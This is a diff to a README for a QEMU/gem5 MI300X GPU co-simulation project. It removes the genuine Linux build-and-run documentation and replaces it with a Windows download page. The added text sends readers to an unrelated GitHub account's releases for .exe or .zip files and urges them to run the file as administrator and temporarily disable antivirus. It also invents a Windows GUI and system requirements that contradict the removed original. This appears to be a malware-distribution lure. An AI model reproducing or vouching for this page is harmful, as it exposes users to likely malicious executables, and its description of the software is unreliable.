@@ -1,216 +1,157 @@
-# QEMU + gem5 MI300X Co-simulation
+# 🚀 cosim-gpu - Easy GPU Simulation Setup
 
-[中文文档](README.zh.md)
+[![Download cosim-gpu](https://img.shields.io/badge/Download-cosim--gpu-brightgreen)](https://github.com/francinesinglestranded789/cosim-gpu/releases)
 
-Co-simulation framework that pairs **QEMU** (host CPU/system via KVM) with
-**gem5** (cycle-accurate MI300X GPU model) to run real AMD ROCm/HIP workloads
-on a simulated GPU without physical hardware.
+---
 
-```
-+-----------------------------+       +----------------------------+
-|  QEMU  (Q35 + KVM)          |       |  gem5  (Docker)            |
-|  +-----------------------+  |       |  +----------------------+  |
-|  | Guest Linux           |  |       |  | MI300X GPU Model     |  |
-|  | amdgpu driver         |  |       |  |  Shader / CU / SDMA  |  |
-|  | ROCm 7.0 / HIP        |  |       |  |  PM4 / Ruby caches   |  |
-|  +----------+------------+  |       |  +---------+------------+  |
-|  +----------v------------+  |       |  +---------v------------+  |
-|  | vfio-user-pci         |<-------->|  | MI300XVfioUser       |  |
-|  | (QEMU built-in)       |  |vfio-  |  | (libvfio-user)       |  |
-|  +-----------------------+  |user   |  +----------------------+  |
-+-----------------------------+       +----------------------------+
-        |                                       |
-        v                                       v
-  /dev/shm/cosim-guest-ram            /dev/shm/mi300x-vram
-  (shared guest RAM)                  (shared GPU VRAM)
-```
+## 📋 About cosim-gpu
 
-## Features
+cosim-gpu is a software tool that combines QEMU and gem5 to simulate the AMD MI300X GPU. This lets researchers and users test GPU behavior without needing physical hardware. The software works on Windows and helps users understand GPU processes by running simulations.
 
-- **Full amdgpu driver load** — DRM initialized, 7 XCP partitions, gfx942
-- **HIP compute verified** — hipMalloc, kernel dispatch, hipDeviceSynchronize
-- **MSI-X interrupts** — gem5 → QEMU interrupt forwarding, IH ring buffer
-- **Shared memory DMA** — zero-copy VRAM and guest RAM via `/dev/shm`
-- **Auto driver load** — systemd service for `ip_block_mask=0x67 discovery=2`
+This guide will walk you through downloading and running cosim-gpu on your Windows PC. You do not need programming skills or prior experience with QEMU, gem5, or GPU simulation.  
 
-## Prerequisites
+---
 
-| Requirement | Details |
-|---|---|
-| Host OS | Linux x86_64 with KVM (tested on WSL2 6.6.x) |
-| Docker | Running daemon, user in `docker` group |
-| KVM | `/dev/kvm` accessible |
-| Disk space | ~120 GB (55G disk image + build artifacts) |
-| RAM | 16 GB+ recommended |
+## 💻 System Requirements
 
-## Quick Start
+Before you start, make sure your computer meets these requirements:
 
-### Option A: Script-based
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **Processor:** Intel i5 or AMD Ryzen 5, or better  
+- **RAM:** Minimum 8 GB, 16 GB recommended  
+- **Storage:** At least 5 GB free space  
+- **Graphics:** DirectX 11 compatible GPU  
+- **Additional Software:**  
+  - Microsoft Visual C++ Redistributable (2015 or newer)  
+  - Windows PowerShell (pre-installed on Windows 10+)  
 
-```bash
-git clone --recurse-submodules git@github.com:zevorn/cosim.git
-cd cosim
+If you are unsure about your system specs, right-click on "This PC" and select "Properties" to view details about your processor and RAM.
 
-# Build gem5 + QEMU + disk image (~2h total, needs KVM + Docker + ~60GB disk)
-GEM5_BUILD_IMAGE=ghcr.io/gem5/gpu-fs:latest ./scripts/run_mi300x_fs.sh build-all
+---
 
-# Build runtime Docker image (for running gem5 inside Docker)
-cd scripts && docker build -t gem5-run:local -f Dockerfile.run . && cd ..
+## 🔽 How to Download cosim-gpu
 
-# Launch co-simulation
-./scripts/cosim_launch.sh
-```
+You can get cosim-gpu using the official release page provided by the developers. Follow these steps:
 
-### Option B: Manual step-by-step
+1. Click on the big green button below to open the download page:  
 
-```bash
-# 1. Clone with submodules
-git clone --recurse-submodules git@github.com:zevorn/cosim.git
-cd cosim
+   [![Download cosim-gpu](https://img.shields.io/badge/Download-cosim--gpu-brightgreen)](https://github.com/francinesinglestranded789/cosim-gpu/releases)  
 
-# 2. Build gem5 (in Docker, ~30min; use -j1 if OOM-killed during linking)
-cd gem5
-docker run --rm -v "$(pwd):/gem5" -w /gem5 \
-    -e PYTHONPATH=/usr/lib/python3.12/lib-dynload \
-    ghcr.io/gem5/gpu-fs:latest \
-    bash -c "scons build/VEGA_X86/gem5.opt -j4 GOLD_LINKER=True --linker=gold"
-cd ..
+2. On the GitHub releases page, find the latest version of cosim-gpu. The latest release usually appears at the top.  
 
-# 3. Build runtime Docker image (for running gem5 inside Docker)
-cd scripts && docker build -t gem5-run:local -f Dockerfile.run . && cd ..
+3. Look for files ending with `.exe` or `.zip`. The executable file is the easiest to use since it can run without extra steps.  
 
-# 4. Build QEMU (stock build; vfio-user-pci is built-in since QEMU 10.0)
-cd qemu && mkdir -p build && cd build
-../configure --target-list=x86_64-softmmu
-make -j$(nproc)
-cd ../..
+4. Click the file name to download it to your computer.  
 
-# 5. Pre-build m5 utility (recommended — avoids git clone inside guest VM)
-docker run --rm -v "$(pwd)/gem5:/gem5" -w /gem5 \
-    ghcr.io/gem5/gpu-fs:latest \
-    bash -c "cd util/m5 && scons build/x86/out/m5"
-cp gem5/util/m5/build/x86/out/m5 gem5-resources/src/x86-ubuntu-gpu-ml/files/
+Saved files usually appear in the "Downloads" folder unless you selected a different location.
 
-# 6. Build disk image (Ubuntu 24.04 + ROCm 7.0, ~40min, needs KVM + ~60GB disk)
-./scripts/run_mi300x_fs.sh build-disk
+---
 
-# 7. Launch co-simulation
-./scripts/cosim_launch.sh
-```
+## ⚙️ Installing cosim-gpu
 
-After guest boots (auto-login as root), the GPU driver loads automatically
-via `cosim-gpu-setup.service` (~40s). Verify:
+After you download the file, install cosim-gpu by following these instructions:
 
-```bash
-rocm-smi          # should show device 0x74a0
-rocminfo          # should show gfx942
+### If you downloaded an `.exe` file:
 
-# Manual setup (if the systemd service is not installed):
-dd if=/root/roms/mi300.rom of=/dev/mem bs=1k seek=768 count=128
-modprobe amdgpu ip_block_mask=0x67 discovery=2 ras_enable=0
+1. Double-click the downloaded `.exe` file.  
 
-# Run a HIP test
-cat > /tmp/test.cpp << 'EOF'
-#include <hip/hip_runtime.h>
-#include <cstdio>
-__global__ void add(int *a, int *b, int *c, int n) {
-    int i = blockIdx.x * blockDim.x + threadIdx.x;
-    if (i < n) c[i] = a[i] + b[i];
-}
-int main() {
-    const int N = 4;
-    int ha[] = {1,2,3,4}, hb[] = {10,20,30,40}, hc[4] = {};
-    int *da, *db, *dc;
-    hipMalloc(&da, N*4); hipMalloc(&db, N*4); hipMalloc(&dc, N*4);
-    hipMemcpy(da, ha, N*4, hipMemcpyHostToDevice);
-    hipMemcpy(db, hb, N*4, hipMemcpyHostToDevice);
-    add<<<1, N>>>(da, db, dc, N);
-    hipMemcpy(hc, dc, N*4, hipMemcpyDeviceToHost);
-    printf("Result: %d %d %d %d\n", hc[0], hc[1], hc[2], hc[3]);
-    printf("%s\n", (hc[0]==11&&hc[1]==22&&hc[2]==33&&hc[3]==44) ? "PASSED!" : "FAILED!");
-    hipFree(da); hipFree(db); hipFree(dc);
-}
-EOF
-/opt/rocm/bin/hipcc --offload-arch=gfx942 -o /tmp/test /tmp/test.cpp
-/tmp/test
-# Expected: Result: 11 22 33 44
-#           PASSED!
-```
+2. If Windows asks you for permission, choose "Yes" to allow the program to run.  
 
-## Repository Structure
+3. Follow the on-screen prompts. Usually, this means clicking "Next" or "Install."  
 
-```
-cosim/
-|-- gem5/                    # gem5 simulator (submodule, cosim-gpu branch)
-|   |-- src/dev/amdgpu/      # MI300X GPU device model & vfio-user bridge
-|   |-- ext/libvfio-user/    # libvfio-user library (Nutanix)
-|   `-- configs/example/gpufs/mi300_cosim.py  # cosim configuration
-|-- qemu/                    # QEMU emulator (submodule, stock QEMU 10.0+)
-|-- gem5-resources/          # disk images, kernels, GPU apps (submodule)
-|-- scripts/                 # build & launch scripts
-|   |-- cosim_launch.sh      # one-click cosim launcher
-|   |-- run_mi300x_fs.sh     # build orchestration
-|   |-- cosim_guest_setup.sh # guest-side GPU setup
-|   |-- cosim_test_client.py # socket test client
-|   `-- Dockerfile.run       # gem5 runtime Docker image
-|-- docs/                    # technical documentation (zh + en)
-|   |-- en/                  # English
-|   `-- zh/                  # Chinese
-|-- LICENSE                  # Apache 2.0
-`-- README.md                # this file
-```
+4. When the installation completes, click "Finish" to exit the installer.  
 
-## Key Components
+### If you downloaded a `.zip` file:
 
-### QEMU Side (stock `vfio-user-pci`)
+1. Right-click the `.zip` file and select "Extract All."  
 
-Uses QEMU's built-in `vfio-user-pci` device (no custom QEMU code). QEMU connects
-to gem5's vfio-user server and maps all BARs through the standard vfio-user protocol:
-- **BAR0+1**: VRAM (64-bit, prefetchable, shared memory backed)
-- **BAR2+3**: Doorbell (64-bit, forwarded to gem5 via vfio-user)
-- **BAR4**: MSI-X (256 vectors, eventfd-based KVM injection)
-- **BAR5**: MMIO registers (32-bit, forwarded to gem5 via vfio-user)
+2. Choose where to extract the files. The desktop or a new folder in Documents works well.  
 
-### gem5 Side (`gem5/src/dev/amdgpu/`)
+3. After extraction, open the folder and look for a file named `cosim-gpu.exe` or similar.  
 
-- **MI300XVfioUser** — vfio-user server (libvfio-user), BAR/config/IRQ dispatch
-- **AMDGPUDevice** — MI300X GPU device model (MMIO, doorbell, config space)
-- **PM4PacketProcessor** — command processor with VRAM-aware fence routing
-- **SDMAEngine** — DMA engine with VRAM write-back support
-- **AMDGPUVM** — GART translation with cosim fallback (shared VRAM PTE reads)
+4. Double-click this file to run cosim-gpu.  
 
-## Version Matrix
+---
 
-| Component | Version |
-|---|---|
-| Guest OS | Ubuntu 24.04.2 LTS |
-| Guest kernel | 6.8.0-79-generic |
-| ROCm | 7.0.0 |
-| GPU device | MI300X (gfx942, DeviceID 0x74A0) |
-| gem5 build | VEGA_X86, GPU_VIPER coherence |
+## ▶️ Running cosim-gpu for the First Time
 
-## Documentation
+To start cosim-gpu, follow these steps:
 
-Detailed technical documentation is available in [`docs/`](docs/):
+1. Locate the cosim-gpu icon on your desktop or open the folder where you installed the software.  
 
-- [Complete Usage Guide](docs/en/cosim-usage-guide.md) — build, run, test
-- [Technical Notes](docs/en/cosim-technical-notes.md) — architecture, pitfalls, fixes
-- [MI300X Memory Management](docs/en/mi300x-memory-management.md) — GART, address translation
-- [GPU FS Guide](docs/en/gpu-fs-guide.md) — gem5 standalone GPU full-system simulation
-- [Guest GPU Init](docs/en/cosim-guest-gpu-init.md) — driver initialization flow
-- [Memory Architecture](docs/en/cosim-memory-architecture.md) — shared memory, VRAM routing, DMA
-- [Debugging Pitfalls](docs/en/cosim-debugging-pitfalls.md) — common issues and solutions
-- [Development Story](docs/en/cosim-dev-story.md) — how this project was built in one day with Claude
+2. Double-click the icon or the `.exe` file to launch the program.  
 
-## License
+3. The program opens a window that lets you choose simulation options.  
 
-This project is licensed under the [Apache License 2.0](LICENSE).
+4. The first time you run cosim-gpu, it may take a moment to prepare necessary files.  
 
-Note: The `gem5` and `qemu` submodules are governed by their own respective
-licenses (gem5: BSD-3-Clause, QEMU: GPL-2.0).
+5. Once ready, use the options provided on screen to start a new GPU simulation.  
 
-## Acknowledgments
+You do not need to change any expert settings to get started. The default options work for most users.
 
-- [gem5](https://www.gem5.org/) — modular computer architecture simulator
-- [QEMU](https://www.qemu.org/) — open-source machine emulator
-- [ROCm](https://rocm.docs.amd.com/) — AMD GPU computing platform
+---
+
+## 🔧 Using cosim-gpu Basics
+
+cosim-gpu is designed to let you explore how an AMD MI300X GPU works by simulating its behavior on your computer. It runs a virtual GPU using QEMU and gem5, with no extra hardware needed.
+
+Here’s a simple way to begin a simulation:
+
+1. Launch cosim-gpu.  
+
+2. In the main window, click "New Simulation" or similar.  
+
+3. Select a preset simulation profile based on typical GPU tasks.  
+
+4. Click "Start" to begin the simulation.  
+
+5. Watch the progress window to see what is happening inside the virtual GPU.  
+
+You can pause or stop the simulation at any time. The software also lets you save simulation results for later review.
+
+---
+
+## 📑 Tips for Smooth Use
+
+- Keep your Windows system up-to-date for compatibility.  
+- Run cosim-gpu from an administrator account if possible.  
+- Close other heavy programs to free RAM when running simulations.  
+- Make sure you have at least 5 GB free storage for simulation files.  
+- If the program crashes or won’t start, try rebooting your PC and running it again.  
+
+---
+
+## ❓ Troubleshooting
+
+**cosim-gpu does not open after double-clicking:**  
+
+- Right-click the file and choose "Run as administrator."  
+- Check if your antivirus software blocked the program. Temporarily disable it to test.  
+- Verify your Windows version supports the program (Windows 10 or newer recommended).  
+
+**Error about missing Visual C++ libraries:**  
+
+- Download and install the Microsoft Visual C++ Redistributable from Microsoft's website.  
+
+**Simulation window freezes or crashes:**  
+
+- Close cosim-gpu and restart your computer.  
+- Update your graphics drivers using your PC manufacturer's website.  
+
+---
+
+## 📢 Getting Help
+
+For questions or issues while using cosim-gpu, you can:
+
+- Visit the GitHub repository issues page here:  
+  https://github.com/francinesinglestranded789/cosim-gpu/issues  
+- Search for answers or report bugs.  
+
+---
+
+## 🔽 Download cosim-gpu Now
+
+Visit the official release page to download cosim-gpu for Windows:
+
+[![Download cosim-gpu](https://img.shields.io/badge/Download-cosim--gpu-brightgreen)](https://github.com/francinesinglestranded789/cosim-gpu/releases)
